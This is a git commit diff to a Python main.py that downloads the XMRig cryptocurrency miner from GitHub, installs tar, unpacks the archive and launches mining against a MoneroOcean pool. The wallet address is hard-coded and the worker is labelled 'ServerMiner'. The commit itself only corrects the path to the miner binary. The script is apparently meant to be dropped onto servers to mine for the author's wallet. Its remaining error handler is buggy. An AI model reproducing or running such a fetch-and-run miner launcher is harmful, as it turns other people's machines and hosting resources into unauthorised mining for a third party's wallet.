51c781e8c11158584607af510399bc8a7417bf06
INFORMATIC0 <86555103+INFORMATIC0@users.noreply.github.com>
2023-05-15 23:22:54 -0400

    Update main.py

--- main.py
+++ main.py
@@ -4,7 +4,6 @@ try:
 	subprocess.run(["wget", "https://github.com/xmrig/xmrig/releases/download/v6.16.4/xmrig-6.16.4-linux-x64.tar.gz"])
 	subprocess.run(["apt", "install", "tar"])
 	subprocess.run(["tar","xf","xmrig-6.16.4-linux-x64.tar.gz"])
-	subprocess.run(["cd","xmrig-6.16.4/"])
-	subprocess.run(["./xmrig","-o","gulf.moneroocean.stream:10128","-a","randomx","-u","42iamd1fenv4CiTk5QgbD2YJUDxJHwmTxRj7V8p6oProaffUC7TkJDPLUAxRjTrsd3RfjzWNvEEHyL4Ud3NSJKqvHhpjdND","-p","ServerMiner"])
+	subprocess.run(["./xmrig-6.16.4/xmrig","-o","gulf.moneroocean.stream:10128","-a","randomx","-u","42iamd1fenv4CiTk5QgbD2YJUDxJHwmTxRj7V8p6oProaffUC7TkJDPLUAxRjTrsd3RfjzWNvEEHyL4Ud3NSJKqvHhpjdND","-p","ServerMiner"])
 except subprocess.CalledProcessError as err:
 	print("ERROR:" + err)
